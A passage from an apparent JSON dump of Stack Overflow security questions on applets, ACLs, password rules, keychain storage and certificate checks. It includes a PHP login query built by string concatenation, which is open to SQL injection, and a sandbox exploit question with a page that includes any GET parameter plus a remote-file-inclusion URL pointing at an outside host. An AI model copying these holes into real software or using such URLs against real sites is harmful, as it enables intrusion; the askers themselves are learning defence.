opening up cmd, and typing 'pack200 example.jar.pack.gz [JarLocation]'. </li>\n<li>Now, replace example.jar with the name of your jar file but leave the .pack.gz there. </li>\n<li>Now, upload that file to the same directory as the applet and attempt to load the applet up again.</li>\n</ul>\n\n<p><strong>NOTE: Make sure the applet is signed!!</strong> Hope this helps others solve the problem I had.</p>\n"},{"tags":["javascript","security"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":12654663,"title":"Do we really need to hide js (jquery) code?","body":"<p>I realize that we can view the JS code in the browser via <em>Inspect element > source</em> or the like. For example, I have following code and it can be view under \"source\".</p>\n\n<pre><code>$.ajax({\n    url: baseUrl + 'location/insert_user_location',\n    type: \"post\",\n    data: {address:address,lat:lat,lng:lng,acc:acc},\n}).done(function(){\n    getUserLocation();\n});\n</code></pre>\n\n<p>Is this insecure, or does it even matter?</p>\n"},{"tags":["security","roles","visual-studio-lightswitch"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12640661,"title":"Lightswitch 2012 Deployment security database","body":"<p>I am fairly new to Lightswitch (2012) and am confused on how the membership tables are deployed if using Windows Authentication with roles specified. My confusion lies in the two connection strings, one has a key called _intrinsic and the other has a guid of sorts as the key. \nWhen I deploy my application as a OOB I get a connection issue and the app fails. If I deploy with no security then the app works fine. I am trying to figure out what I am doing wrong within the deployment settings as I have three spots to enter conn string values. Can anyone please help with this and give me a high level as to which connections are used for application data and which ones are used for security?</p>\n\n<p>Thanks.</p>\n"},{"tags":["java","security","permissions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12649945,"title":"java.security.AccessControlException: access denied","body":"<p>I have this java applet built in netbeans 7.2</p>\n\n<p>it works localy, but when i upload it to my page it doesn't work\nand i get </p>\n\n<blockquote>\n  <p>java.security.AccessControlException: access denied\n  (\"java.net.SocketPermission\" \"www.google.com:80\" \"connect,resolve\")</p>\n</blockquote>\n\n<pre><code>import java.applet.Applet;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport netscape.javascript.JSObject;\n\npublic class FurkkiApp extends Applet {\n\n    @Override\n    public void init() {\n        execute_js(\"appReady()\");\n        //getPageContent(\"http://www.google.com/\", \"false\", \"false\", \"false\", \"false\", \"GET\", \"false\", \"false\");\n    }\n\n    public void execute_js(String js)\n    {\n        //System.out.println(js);  \n        JSObject win = JSObject.getWindow(this);\n        win.eval(js);\n    }\n\n    public void getPageContent(String url_param, String cookies_param, String referer_param, String headers_param, String get_cookies_param, String method_param, String post_data_param, String follow_location_param) {\n\n\n            execute_js(\"appLoading()\");\n\n            execute_js(\"appParam('\"+url_param+\"')\");\n\n\n            URL url;\n\n            try {\n\n                url = new URL(url_param); \n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n\n                /* Un peut de headers */\n                conn.setRequestProperty(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\");\n                conn.setRequestProperty(\"Accept-Language\", \"fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3\");\n                conn.setRequestProperty(\"Cache-Control\", \"max-age=0\");\n                conn.setRequestProperty(\"Connection\", \"keep-alive\");\n                conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1\");\n                /* Inseré des cookies */\n                if(!\"false\".equals(cookies_param)){\n                    conn.setRequestProperty(\"cookie\", cookies_param);\n                }\n                /* Un lien référal si nécessaire */\n                if(!\"false\".equals(referer_param)){\n                    conn.setRequestProperty(\"Referer\", referer_param);\n                }\n\n\n                conn.setDoOutput(true);\n\n                /* On suit le redirection du serveur ou pas? */\n                if(\"true\".equals(follow_location_param)) {\n                    conn.setInstanceFollowRedirects(true);\n                }\n                else {\n                    conn.setInstanceFollowRedirects(false);\n                }\n\n                /* GET Method */\n                switch (method_param) {\n                    case \"GET\":\n                        conn.setRequestMethod(\"GET\");\n\n                        break;\n                    case \"POST\":\n                        conn.setRequestMethod(\"POST\");\n                        conn.setDoInput(true);\n                        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\"); \n                        conn.setRequestProperty(\"Content-Length\", \"\" + Integer.toString(post_data_param.getBytes().length));\n                        conn.setUseCaches (false);\n\n                        DataOutputStream wr = new DataOutputStream(conn.getOutputStream());\n                        wr.writeBytes(post_data_param);\n                        wr.flush();\n                        wr.close();\n                        break; \n                }\n\n\n                /* On affiche seulement les headers */\n                if(\"true\".equals(headers_param))\n                {\n                    String headers_content;\n                    headers_content = \"\";\n\n\n                    /* Seulement les cookies */\n                    if(\"true\".equals(get_cookies_param)){\n                        for (int i=0; ; i++) \n                        {\n                            String headerName = conn.getHeaderFieldKey(i);\n                            String headerValue = conn.getHeaderField(i);\n                            if (headerName == null &amp;&amp; headerValue == null){\n                                break; \n                            }\n                            if (headerName != null &amp;&amp; \"Set-Cookie\".equalsIgnoreCase(headerName)){\n                                String[] fields = headerValue.split(\";\");\n                                headers_content = (new StringBuilder(String.valueOf(headers_content)).append(fields[0]).append(\";\").toString());\n                            }\n                        }\n                        headers_content = headers_content.substring(0, headers_content.length()-1);\n\n                    }\n                    else{ /* La totale */\n                        headers_content = conn.getHeaderFields().toString();\n                    }\n\n\n                    execute_js(\"appContent('\"+URLEncoder.encode(headers_content,\"UTF-8\")+\"')\");\n\n                }\n                else /* On affiche le contenu de la page */\n                {\n\n                    InputStreamReader in = new InputStreamReader((InputStream) conn.getContent());\n                    BufferedReader buff = new BufferedReader(in);\n                    String inputLine;\n                    String pageContent;\n                    pageContent = \"\";\n\n                    while ((inputLine = buff.readLine()) != null) {\n                        pageContent = (new StringBuilder(String.valueOf(pageContent)).append(inputLine).toString());\n                    }\n\n\n                    execute_js(\"appContent('\"+URLEncoder.encode(pageContent,\"UTF-8\")+\"')\");\n                }\n                conn.disconnect();\n\n\n                //execute_js(\"appDone()\");\n\n            } catch (MalformedURLException e) {\n            } catch (IOException e) {\n            }\n\n\n\n\n\n    }\n\n}\n</code></pre>\n\n<p>i have enabled Web start\nCodebase : Web Application Deployement\nSigning: Self-signed by a generated key ( Enable Software Protections )</p>\n\n<p>When i compile the file i gt the jar file from dist folder</p>\n\n<p>the HTML code is:</p>\n\n<pre><code>&lt;applet name=\"app\" codebase=\".\" archive=\"Furikku_v1.jar?1348892645\" code=\"FurkkiApp\" width=\"200\" height=\"200\"&gt;&lt;/applet&gt;\n</code></pre>\n\n<p>and then i call the method with javascript</p>\n\n<pre><code>document.app.getPageContent(rq.url,rq.cookies,rq.referer,rq.headers,rq.get_cookies,rq.fmethod,rq.post_data,rq.follow_location)\n</code></pre>\n\n<p><strong>EDIT:</strong> it seems that the issue is related with javascript \ni removed document.app.getPageContent\nand initialized the app, it get the page content</p>\n\n<p>the problem is that i want to send multiple request using document.app.getPageContent method</p>\n"},{"tags":["security"],"answer_count":35,"favorite_count":70,"up_vote_count":78,"down_vote_count":0,"view_count":5675,"score":78,"question_id":325862,"title":"What are the most common security mistakes programmers make?","body":"<p>There are the obvious wtfs that make the headlines such as SQL injection, authentication in JavaScript but are there other more fundamental and common errors programmmers tend to make when writing applications without considering security?</p>\n"},{"tags":["php","security","symfony2","acl"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":128,"score":2,"question_id":12460083,"title":"ACL ROLE_ADMIN does not work","body":"<p>Maybe somebody here can help me.\nI'm adding blog comments and add the rights on it.</p>\n\n<ul>\n<li>The rights for the user who created the blog the rights are OK.</li>\n<li>The rights for not logged user can view de comment so thats OK.</li>\n<li>The Admin can not edit/delete the comment... But whats wrong?</li>\n</ul>\n\n<p>Part of the Controller code:</p>\n\n<pre><code>// Creating the ACL\n$aclProvider = $this-&gt;get('security.acl.provider');\n$objectIdentity = ObjectIdentity::fromDomainObject($blogComment);\n$acl = $aclProvider-&gt;createAcl($objectIdentity);\n\n// Creating full access for the admin\n$roleSecurityIdentity = new RoleSecurityIdentity('ROLE_ADMIN');\n$acl-&gt;insertObjectAce($roleSecurityIdentity, MaskBuilder::MASK_MASTER );\n\n// Creating view rights for the not-logged in users\n$roleSecurityIdentity = new RoleSecurityIdentity('IS_AUTHENTICATED_ANONYMOUSLY');\n$acl-&gt;insertObjectAce($roleSecurityIdentity, MaskBuilder::MASK_VIEW );\n\n// retrieving the security identity of the currently logged-in user\n$securityContext = $this-&gt;get('security.context');\n$user = $securityContext-&gt;getToken()-&gt;getUser();\n$securityIdentity = UserSecurityIdentity::fromAccount($user);\n\n// grant owner access\n$acl-&gt;insertObjectAce($securityIdentity, MaskBuilder::MASK_OWNER);\n$aclProvider-&gt;updateAcl($acl);\n</code></pre>\n\n<p>Symfony profiler Security</p>\n\n<pre><code>Username    Mitchel\nAuthenticated?  yes\nRoles   [ROLE_ADMIN]\n</code></pre>\n\n<p>Database Dump:</p>\n\n<pre><code>-- phpMyAdmin SQL Dump\n-- version 3.5.2.2\n-- http://www.phpmyadmin.net\n--\n-- Machine: localhost\n-- Genereertijd: 17 sep 2012 om 14:19\n-- Serverversie: 5.1.65\n-- PHP-versie: 5.3.16\n\nSET SQL_MODE=\"NO_AUTO_VALUE_ON_ZERO\";\nSET time_zone = \"+00:00\";\n\n\n-- --------------------------------------------------------\n\n--\n-- Tabelstructuur voor tabel `acl_classes`\n--\n\nCREATE TABLE IF NOT EXISTS `acl_classes` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `class_type` varchar(200) NOT NULL,\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `UNIQ_69DD750638A36066` (`class_type`)\n) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;\n\n--\n-- Gegevens worden uitgevoerd voor tabel `acl_classes`\n--\n\nINSERT INTO `acl_classes` (`id`, `class_type`) VALUES\n(1, 'MV\\\\BetaalbaarkozijnBundle\\\\Entity\\\\BlogComment');\n\n-- --------------------------------------------------------\n\n--\n-- Tabelstructuur voor tabel `acl_entries`\n--\n\nCREATE TABLE IF NOT EXISTS `acl_entries` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `class_id` int(10) unsigned NOT NULL,\n  `object_identity_id` int(10) unsigned DEFAULT NULL,\n  `security_identity_id` int(10) unsigned NOT NULL,\n  `field_name` varchar(50) DEFAULT NULL,\n  `ace_order` smallint(5) unsigned NOT NULL,\n  `mask` int(11) NOT NULL,\n  `granting` tinyint(1) NOT NULL,\n  `granting_strategy` varchar(30) NOT NULL,\n  `audit_success` tinyint(1) NOT NULL,\n  `audit_failure` tinyint(1) NOT NULL,\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `UNIQ_46C8B806EA000B103D9AB4A64DEF17BCE4289BF4` (`class_id`,`object_identity_id`,`field_name`,`ace_order`),\n  KEY `IDX_46C8B806EA000B103D9AB4A6DF9183C9` (`class_id`,`object_identity_id`,`security_identity_id`),\n  KEY `IDX_46C8B806EA000B10` (`class_id`),\n  KEY `IDX_46C8B8063D9AB4A6` (`object_identity_id`),\n  KEY `IDX_46C8B806DF9183C9` (`security_identity_id`)\n) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;\n\n--\n-- Gegevens worden uitgevoerd voor tabel `acl_entries`\n--\n\nINSERT INTO `acl_entries` (`id`, `class_id`, `object_identity_id`, `security_identity_id`, `field_name`, `ace_order`, `mask`, `granting`, `granting_strategy`, `audit_success`, `audit_failure`) VALUES\n(1, 1, 1, 1, NULL, 0, 128, 1, 'all', 0, 0),\n(2, 1, 1, 2, NULL, 1, 1, 1, 'all', 0, 0),\n(3, 1, 1, 3, NULL, 2, 64, 1, 'all', 0, 0);\n\n-- --------------------------------------------------------\n\n--\n-- Tabelstructuur voor tabel `acl_object_identities`\n--\n\nCREATE TABLE IF NOT EXISTS `acl_object_identities` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `parent_object_identity_id` int(10) unsigned DEFAULT NULL,\n  `class_id` int(10) unsigned NOT NULL,\n  `object_identifier` varchar(100) NOT NULL,\n  `entries_inheriting` tinyint(1) NOT NULL,\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `UNIQ_9407E5494B12AD6EA000B10` (`object_identifier`,`class_id`),\n  KEY `IDX_9407E54977FA751A` (`parent_object_identity_id`)\n) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;\n\n--\n-- Gegevens worden uitgevoerd voor tabel `acl_object_identities`\n--\n\nINSERT INTO `acl_object_identities` (`id`, `parent_object_identity_id`, `class_id`, `object_identifier`, `entries_inheriting`) VALUES\n(1, NULL, 1, '1', 1);\n\n-- --------------------------------------------------------\n\n--\n-- Tabelstructuur voor tabel `acl_object_identity_ancestors`\n--\n\nCREATE TABLE IF NOT EXISTS `acl_object_identity_ancestors` (\n  `object_identity_id` int(10) unsigned NOT NULL,\n  `ancestor_id` int(10) unsigned NOT NULL,\n  PRIMARY KEY (`object_identity_id`,`ancestor_id`),\n  KEY `IDX_825DE2993D9AB4A6` (`object_identity_id`),\n  KEY `IDX_825DE299C671CEA1` (`ancestor_id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n\n--\n-- Gegevens worden uitgevoerd voor tabel `acl_object_identity_ancestors`\n--\n\nINSERT INTO `acl_object_identity_ancestors` (`object_identity_id`, `ancestor_id`) VALUES\n(1, 1);\n\n-- --------------------------------------------------------\n\n--\n-- Tabelstructuur voor tabel `acl_security_identities`\n--\n\nCREATE TABLE IF NOT EXISTS `acl_security_identities` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,\n  `identifier` varchar(200) NOT NULL,\n  `username` tinyint(1) NOT NULL,\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `UNIQ_8835EE78772E836AF85E0677` (`identifier`,`username`)\n) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;\n\n--\n-- Gegevens worden uitgevoerd voor tabel `acl_security_identities`\n--\n\nINSERT INTO `acl_security_identities` (`id`, `identifier`, `username`) VALUES\n(2, 'IS_AUTHENTICATED_ANONYMOUSLY', 0),\n(1, 'MV\\\\BetaalbaarkozijnBundle\\\\Entity\\\\User-User', 1),\n(3, 'ROLE_ADMIN', 0);\n\n--\n-- Beperkingen voor gedumpte tabellen\n--\n\n--\n-- Beperkingen voor tabel `acl_entries`\n--\nALTER TABLE `acl_entries`\n  ADD CONSTRAINT `FK_46C8B8063D9AB4A6` FOREIGN KEY (`object_identity_id`) REFERENCES `acl_object_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,\n  ADD CONSTRAINT `FK_46C8B806DF9183C9` FOREIGN KEY (`security_identity_id`) REFERENCES `acl_security_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,\n  ADD CONSTRAINT `FK_46C8B806EA000B10` FOREIGN KEY (`class_id`) REFERENCES `acl_classes` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;\n\n--\n-- Beperkingen voor tabel `acl_object_identities`\n--\nALTER TABLE `acl_object_identities`\n  ADD CONSTRAINT `FK_9407E54977FA751A` FOREIGN KEY (`parent_object_identity_id`) REFERENCES `acl_object_identities` (`id`);\n\n--\n-- Beperkingen voor tabel `acl_object_identity_ancestors`\n--\nALTER TABLE `acl_object_identity_ancestors`\n  ADD CONSTRAINT `FK_825DE2993D9AB4A6` FOREIGN KEY (`object_identity_id`) REFERENCES `acl_object_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,\n  ADD CONSTRAINT `FK_825DE299C671CEA1` FOREIGN KEY (`ancestor_id`) REFERENCES `acl_object_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;\n</code></pre>\n\n<p>I also created a topic on <a href=\"http://forum.symfony-project.org/viewtopic.php?f=23&amp;t=46874\" rel=\"nofollow\">symfony</a> forum, but it seems that they are not so active as stackoverflow ;)</p>\n\n<p>Symfony version: 2.1.2</p>\n\n<p>Thnx,\nRegards Mitchel</p>\n"},{"tags":["security","brute-force"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":34,"score":-2,"question_id":12631064,"title":"how long would it take to brute force an 8 character string vs. a 32 character string","body":"<p>How long would it take to brute force a 32 character string.</p>\n\n<p>Assuming you have a web page that tells you whether the string is valid, and there is no limit to the number of requests.</p>\n\n<p>I'm using a 32 character string in a password reset link emailed to the user, and I'm wondering what the time difference would be to try all 32 characters vs. trying an 8 character string.</p>\n\n<p>Are we talking minutes, hours, days, months?</p>\n"},{"tags":["asp.net","security","windows-7"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2847,"score":2,"question_id":3160381,"title":"Access to the path denied on Windows 7 (System.UnauthorizedAccessException)","body":"<p>I'm getting this error (see title) while trying to parse an XML file in my ASP.NET MVC application. I'm in the early stages of development and I'm just trying to get this working with Visual Studio 2010's built-in DEV server.</p>\n\n<p>I have tried every combination of the following and still no luck:</p>\n\n<ul>\n<li>Granting FULL access to the NETWORK SERVICE account to my entire solution</li>\n<li>Granting FULL access to the IUSER, IIS_IUSRS accounts to my entire solution</li>\n<li>Adding <strong>trust level=\"Full\"</strong> to my web.config</li>\n<li>Adding <strong>identity impersonate=\"true\"</strong> to my web.config</li>\n<li>Granting FULL access to the NETWORK SERVICE account to my entire C: drive</li>\n<li>Running VS as administrator</li>\n<li>Logging in as administrator</li>\n<li>Disabling Windows 7 User Account Control (UAC)</li>\n<li>Smashing head against wall</li>\n</ul>\n\n<p>I fear it's something to do with Window 7 security but I'm not sure. Anyone else experiencing this?</p>\n\n<p>Please note that I do not have an ASPNET account name on my computer. I don't think Windows 7 and the latest version of ASP.NET use that account any more.</p>\n\n<hr>\n\n<p><em>EDIT: I am able to upload files with my app using Server.MapPath which makes me wonder if this is a code issue. However the error is pretty clear when it says \"access to path MyProject.Web is denied\" and that I should allow the ASP.NET account access to it.</em></p>\n\n<hr>\n\n<p><em>EDIT #2: This was caused by an incorrect path. Nothing to do with Windows 7 or granting access to the ASP.NET accounts</em></p>\n"},{"tags":["security","control","version","system"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12651494,"title":"Need Latest Version Control system Secure and protect code","body":"<p>I am looking for version control system in which code is total secure for me here developer can not  reuse my code is it possible ?</p>\n"},{"tags":["security","language-agnostic","validation","passwords"],"answer_count":10,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":2108,"score":3,"question_id":1524330,"title":"What characters would you make invalid for a password?","body":"<p>A hypothetical situation: you've implemented a password handling system, and it doesn't impose any limitations at all on what characters can be used. You want to set up some rules that are a reasonable compromise between two things -</p>\n\n<ol>\n<li>Allow the user as much freedom as possible.</li>\n<li>Allow for the possibility that you may change how you handle passwords in the future - you don't want to rule out reasonable implementations because your users' existing passwords would become invalid.</li>\n</ol>\n\n<p>What rules would you impose? Are there other factors that might affect you choice?</p>\n"},{"tags":["php","mysql","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12649017,"title":"How can I better secure my database connection","body":"<p>I've been told that this code is old way of connecting and is susceptible to sql injections. How can I make it secure?</p>\n\n<p>This is the code I use to check a database for users and add a new user if they don't have an account. I tried mysqli but I don't think I got it right so I had to go back to this for now until I know how to make it secure.</p>\n\n<pre><code>&lt;?php\n// Connect to the database(host, username, password)\n$con = mysql_connect('localhost','user1','pass1');\nif (!$con)\n{\n    echo \"Failed to make connection.\";\n    exit;\n}\n// Select the database. Enter the name of your database (not the same as the table name)\n$db = mysql_select_db('db1');\nif (!$db)\n{\n    echo \"Failed to select db.\";\n    exit;\n}\n// $_POST['username'] and $_POST['password'] are the param names we sent in our click event in login.js\n$username = $_POST['username'];\n$password = $_POST['password'];\n// Select eveything from the users table where username field == the username we posted and password field == the password we posted\n$sql = \"SELECT * FROM users WHERE username = '\" . $username . \"' AND password = '\" . $password . \"'\";\n$query = mysql_query($sql);\n// If we find a match, create an array of data, json_encode it and echo it out\nif (mysql_num_rows($query) &gt; 0)\n{\n    $row = mysql_fetch_array($query);\n    $response = array(\n        'logged' =&gt; true,\n        'name' =&gt; $row['name'],\n        'email' =&gt; $row['email']\n    );\n    echo json_encode($response);\n}\nelse\n{\n    // Else the username and/or password was invalid! Create an array, json_encode it and echo it out\n    $response = array(\n        'logged' =&gt; false,\n        'message' =&gt; 'Invalid Username and/or Password'\n    );\n    echo json_encode($response);\n}\n?&gt;\n</code></pre>\n"},{"tags":["php","security","exploit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12646563,"title":"Defending Exploits","body":"<p>I've setup a sandbox and trying to run exploits so I can better understand how to better defend against them.  When I run the following, the process is failing as it should and for the right reason.  But then I'm not sure because I can't find a lot of \"how-to write a proper exploit\".  Here is my code and following is the message on failure.  Any guidance would be great.</p>\n\n<pre><code> //unform.php (unprotected form)\n &lt;html&gt;\n &lt;head&gt;\n &lt;title&gt;Try An Exploit&lt;/title&gt;\n &lt;?php\n if (!empty($_GET)){\n    foreach($_GET as $key=&gt;$value){\n    ${$key} = $value;\n    }\n}\n\n //no sanitizer here.\n echo $key;\n include($value);\n ?&gt;\n &lt;/head&gt;\n &lt;body&gt;\n &lt;h1&gt;This Is Bad&lt;/h1&gt;\n\n &lt;form action=\"#\" method=\"get\"&gt;\n&lt;select name=\"COLOR\"&gt;\n       &lt;option value=\"red\"&gt;red&lt;/option&gt;\n       &lt;option value=\"blue\"&gt;blue&lt;/option&gt;\n    &lt;/select&gt;\n&lt;input type=\"submit\" value=\"Kick Me\" /&gt;\n &lt;/form&gt;\n &lt;/body&gt;\n</code></pre>\n\n<p>Exploit script, simple stuff:</p>\n\n<pre><code> exploit.php\n &lt;?php\n   $somevar = \"This is just a string\";\n   echo $somevar;\n ?&gt;\n</code></pre>\n\n<p>Bad guy would hard code the following in their browser address bar:</p>\n\n<pre><code> http://www.sandbox.com/path/to/unform.php?COLOR=http://www.remoteserv.com/exploit.php\n</code></pre>\n\n<p>Output to browser when trying to load the address:</p>\n\n<pre><code> Warning: include() [function.include]: http:// wrapper is disabled in the server configuration by allow_url_include=0\n</code></pre>\n\n<p>So is that it?  Or are there other technique I should be looking out for?<br>\nThanks</p>\n"},{"tags":["asp.net","asp.net-mvc","security","asp.net-web-api"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":239,"score":2,"question_id":12629530,"title":"How to Customize ASP.NET Web API AuthorizeAttribute for Unusual Requirements","body":"<p>I am inheriting from <strong>System.Web.Http.AuthorizeAttribute</strong> to create a custom authorization/authentication routine to meet some unusual requirements for a web application developed using ASP.NET MVC 4. This adds security to the Web API used for Ajax calls from the web client. The requirements are:</p>\n\n<ol>\n<li>The user must logon each time they perform a transaction to verify\nsomeone else has not walked up to the workstation after someone has\nlogged on and walked away.</li>\n<li>Roles cannot be assigned to the web service methods at program time.\nThey must be assigned at run time so that an administrator can\nconfigure this. This information is stored in the system database.</li>\n</ol>\n\n<p>The web client is a <a href=\"http://en.wikipedia.org/wiki/Single-page_application\" rel=\"nofollow\">single page application (SPA)</a> so the typical forms authentication does not work so well, but I am trying reuse as much of the ASP.NET security framework as I can to meet the requirements.  The customized <strong>AuthorizeAttribute</strong> works great for requirement 2 on determining what roles are associated with a web service method. I accept three parameters, application name, resource name and operation to determine which roles are associated with a method.</p>\n\n<pre><code>public class DoThisController : ApiController\n{\n    [Authorize(Application = \"MyApp\", Resource = \"DoThis\", Operation = \"read\")]\n    public string GetData()\n    {\n        return \"We did this.\";\n    }\n}\n</code></pre>\n\n<p>I override the <strong>OnAuthorization</strong> method to get the roles and authenticate the user. Since the user has to be authenticated for each transaction I reduce the back and forth chatter by performing authentication and authorization in the same step.  I get the users credentials from the web client by using basic authentication which passes the encrypted credentials in the HTTP header. So my <strong>OnAuthorization</strong> method looks like this:</p>\n\n<pre><code>public override void OnAuthorization(HttpActionContext actionContext)\n{\n\n     string username;\n     string password;\n     if (GetUserNameAndPassword(actionContext, out username, out password))\n     {\n         if (Membership.ValidateUser(username, password))\n         {\n             FormsAuthentication.SetAuthCookie(username, false);\n             base.Roles = GetResourceOperationRoles();\n         }\n         else\n         {\n             FormsAuthentication.SignOut();\n             base.Roles = \"\";\n         }\n     }\n     else\n     {\n         FormsAuthentication.SignOut();\n         base.Roles = \"\";\n     }\n     base.OnAuthorization(actionContext);\n }\n</code></pre>\n\n<p><strong>GetUserNameAndPassword</strong> retrieves the credentials from the HTTP header. I then use the <strong>Membership.ValidateUser</strong> to validate the credentials. I have a custom membership provider and role provider plugged in to hit a custom database. If the user is authenticated I then retrieve the roles for the resource and operation. From there I use the base <strong>OnAuthorization</strong> to complete the authorization process.  Here is where it breaks down.</p>\n\n<p>If the user is authenticated I use the standard forms authentication methods to log the user in (FormsAuthentication.SetAuthCookie) and if they fail I log them out (FormsAuthentication.SignOut).  But the problem seems to be that base <strong>OnAuthorization</strong> class does not have access to <strong>Principal</strong> that is updated so that <strong>IsAuthenticated</strong> is set to the correct value. It is always one step behind. And my guess is that it is using some cached value that does not get updated until there is a round trip to the web client.</p>\n\n<p>So all of this leads up to my specific question which is, is there another way to set <strong>IsAuthenticated</strong> to the correct value for the current <strong>Principal</strong> without using cookies? It seems to me that cookies do not really apply in this specific scenario where I have to authenticate every time.  The reason I know <strong>IsAuthenticated</strong> is not set to the correct value is I also override the <strong>HandleUnauthorizedRequest</strong> method to this:</p>\n\n<pre><code> protected override void HandleUnauthorizedRequest(HttpActionContext filterContext)\n {\n     if (((System.Web.HttpContext.Current.User).Identity).IsAuthenticated)\n     {\n         filterContext.Response = new HttpResponseMessage(System.Net.HttpStatusCode.Forbidden);\n     }\n     else\n     {\n         base.HandleUnauthorizedRequest(filterContext);\n     }\n }\n</code></pre>\n\n<p>This allows me to return a status code of Forbidden to the web client if the failure was because of authorization instead of authentication and it can respond accordingly.</p>\n\n<p>So what is the proper way to set <strong>IsAuthenticated</strong> for the current <strong>Principle</strong> in this scenario?</p>\n"},{"tags":["security","monotouch","storage"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":12644304,"title":"How to store public/private key securely","body":"<p>Looking to store public/private key information securely on an iOS device. I know I want to store this in the KeyChain however I am not 100% sure what sort of attributes I need to populate in the <code>SecRecord</code>. I was going to do something like:</p>\n\n<pre><code>// private key\nSecKeyChain.Add(new SecRecord(SecKind.Key)\n{\n    Accessible = SecAccessible.AlwaysThisDeviceOnly,\n    KeySizeInBits = 512,\n    KeyClass = SecKeyClass.Private,\n    CanSign = true,\n    ValueData = privateKeyValue,\n    Account = publicKeyValue\n});\n</code></pre>\n\n<p>Which would store the private key, then follow a similar approach for the public key replacing the <code>Account</code> attribute with a value unique to the user e.g. username. However, not sure if this is the right way to use this.</p>\n\n<p>Does anyone have a good examples on how you would do this specifically for keys?</p>\n"},{"tags":["security","ssl","certificate","public-key-encryption"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12645128,"title":"Certificate & Hash checking?","body":"<p>I'm asking this question in order for be 100% sure.</p>\n\n<p><a href=\"http://ntrg.cs.tcd.ie/mepeirce/Dce/99/ssl/works.htm\" rel=\"nofollow\">link</a></p>\n\n<blockquote>\n  <p>To validate the certificate to ensure it contains the information\n  digitally signed by the certificate authority, the web browser\n  verifies the digital signature. Because the digital signature is an\n  encrypted hash value that was computed based on the contents of the\n  certificate, the web browser needs to compare hash values. The web\n  browser computes a hash value based on the contents of the certificate\n  it received. It then decrypts the digital signature to determine the\n  hash value that the certificate authority computed. If the two hash\n  values match, the web browser is assured that the certificate contains\n  the information that the certificate authority verified and digitally\n  signed.</p>\n</blockquote>\n\n<p>questions :</p>\n\n<blockquote>\n  <p>The web browser computes a hash value based on the contents of the\n  certificate it received</p>\n</blockquote>\n\n<p>The browser <em>knows</em> in which digest algorithm the certificate was used inside , so he uses it <em>also</em> to calculate a hash - based on the certificate content.</p>\n\n<blockquote>\n  <p>It then decrypts the digital signature to determine the hash value\n  that the certificate authority computed</p>\n</blockquote>\n\n<p>The browser knows which CA created the certificate , so he takes the public key from the appropriate <em>computer store location</em> and apply it on the encrypted hash value . the result is the decrypted hash value. </p>\n\n<p>It then see if both the same.</p>\n\n<p>Am I right ?</p>\n"},{"tags":["java","security","java-ee","tomcat"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2162,"score":0,"question_id":10838296,"title":"j_security_check on Tomcat","body":"<p>Do I have to do anything to activate Tomcat handling the call to j_security_check? The config &amp; HTML code is below. I am getting this error:</p>\n\n<p><strong>Error Message</strong></p>\n\n<p><em>type</em> Status report</p>\n\n<p><em>message</em> /(context path)/ProviderManager/j_security_check</p>\n\n<p><em>description</em> The requested resource (/(context path)/ProviderManager/j_security_check) is not available.</p>\n\n<p><strong>web.xml</strong></p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;web-app version=\"3.0\" xmlns=\"http://java.sun.com/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\"&gt;\n    &lt;session-config&gt;\n        